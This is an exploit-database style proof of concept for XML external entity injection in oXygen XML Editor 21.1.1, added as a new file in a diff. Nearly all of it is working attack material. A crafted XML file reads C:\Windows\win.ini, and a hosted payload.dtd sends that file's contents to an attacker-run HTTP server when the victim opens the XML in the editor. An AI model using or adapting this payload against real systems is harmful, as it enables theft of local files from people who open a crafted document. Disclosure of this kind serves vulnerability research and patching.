@@ -1,0 +1,28 @@
+# Exploit Title: oXygen XML Editor 21.1.1 - XML External Entity Injection
+# Author: Pablo Santiago
+# Date: 2019-11-13
+# Vendor Homepage: https://www.oxygenxml.com/
+# Source:https://www.oxygenxml.com/xml_editor/download_oxygenxml_editor.html
+# Version: 21.1.1
+# CVE : N/A
+# Tested on: Windows 7
+
+#PoC
+
+1- python -m SimpleHTTPServer 8000
+1.1- Poc.xml :
+<?xml version="1.0"?>
+<!DOCTYPE test [
+<!ENTITY % file SYSTEM "C:\Windows\win.ini">
+<!ENTITY % dtd SYSTEM "http://localhost:8000/payload.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+
+1.2.- payload.dtd
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:8000?%file;'>">
+%all;
+2- File -> Open -> *.xml
+
+#PoC Visual
+https://imgur.com/2H8DhL9
